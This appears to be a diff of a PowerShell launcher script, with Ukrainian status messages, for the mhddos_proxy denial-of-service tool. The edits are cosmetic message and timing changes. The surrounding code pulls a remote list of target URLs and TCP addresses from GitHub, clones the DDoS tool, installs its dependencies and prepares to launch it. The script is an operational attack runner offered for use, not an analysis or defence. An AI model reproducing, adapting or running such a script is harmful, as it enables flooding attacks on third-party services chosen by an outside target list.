@@ -16,12 +16,12 @@ Write-MidleHost "Powershell v.$($PSVersionTable.PSVersion)" -ForegroundColor 'Gr
 Write-Host ""
 
 # get targets
-Write-MidleHost "Завантаження цілей..." -NoNewline
+Write-MidleHost "Завантаження цілей" -NoNewline
 $TargetsSrc = "https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets"
 $TargetsList = ( Download-String -SourceUrl $TargetsSrc ) -split "\n" | 
     Where-Object { ( $_ -notlike '#*' ) -or ($_ -like 'http*') -or ($_ -like 'tcp://*') } |
     Foreach-Object {$_ -split " "} | Sort-Object -Unique
-Start-Sleep -Seconds 1
+Start-Sleep -Seconds 1 | Out-null
 
 # create target files with 360 entries or less
 $TargetNumber = $TargetsList.Length
@@ -29,7 +29,7 @@ $TargetsList > "$RootPath\tmp\xaa.uaripper"
 Write-MidleHost "Знайдено $TargetNumber цілей" -Here
 $TargetsList = $null
 
-Write-MidleHost "Завантаження mhddos_proxy..." -NoNewline
+Write-MidleHost "Завантаження mhddos_proxy" -NoNewline
 $RemoteMhddosProxy = 'https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git'
 if (Test-Path -Path $LocalMhddosProxy) {
     &"$RootPath\Git\cmd\git.exe" -C $LocalMhddosProxy pull --quiet
@@ -39,11 +39,14 @@ else {
     &"$RootPath\Git\cmd\git.exe" clone "$RemoteMhddosProxy" "$LocalMhddosProxy" --quiet
     $message = "mhddos_proxy було встановлено!"
 }
-Write-MidleHost $message
+Write-MidleHost $message -Here -NoNewline
+Start-Sleep -Seconds 2
 
-Write-MidleHost "Створення і активація віртуального оточення..." -NoNewline
+Write-MidleHost "Створення і активація віртуального оточення" -Here -NoNewline
 &"$PyPath\python.exe" -m virtualenv $VenvPath --quiet
 &"$VenvPath\Scripts\activate.ps1"
 
-Write-MidleHost "Завантаження додаткових компонентів mhddos_proxy..." -Here -NoNewline
+Write-MidleHost "Завантаження додаткових компонентів mhddos_proxy" -Here -NoNewline
 &"$PyPath\python.exe" -m pip install -r "$LocalMhddosProxy\requirements.txt" --quiet
+Write-MidleHost "Готово" -Here -NoNewline
+Write-MidleHost "Запуск"
